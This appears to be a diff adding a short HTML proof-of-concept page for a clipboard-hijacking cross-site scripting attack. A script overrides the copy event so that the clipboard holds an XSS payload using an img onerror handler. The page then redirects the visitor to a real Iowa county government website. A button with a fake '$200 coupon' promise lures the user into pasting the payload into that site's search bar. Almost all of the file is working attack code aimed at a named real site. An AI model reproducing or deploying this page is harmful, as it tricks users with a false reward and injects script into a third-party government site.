@@ -1,0 +1,17 @@
+<!doctype html><meta charset=utf-8>
+
+<script>
+   
+    function getExploitJson() {
+        payload = "Hi everyone,the game is started if you copy this content and paste it into search field,it will occur the xss'\"/><img/src=\"\"onerror=alert(document.domain)>"
+        return payload;
+    }
+   
+    document.oncopy = ev => {
+        ev.preventDefault();
+        ev.clipboardData.setData('text/plain', getExploitJson());
+        location.href = "https://madisoncounty.iowa.gov/wdig/"
+    }
+</script>
+Please <button onclick="document.execCommand('copy')">copy</button> me,Once you paste it into the website search bar, you will receive a $200 coupon.
+</html>
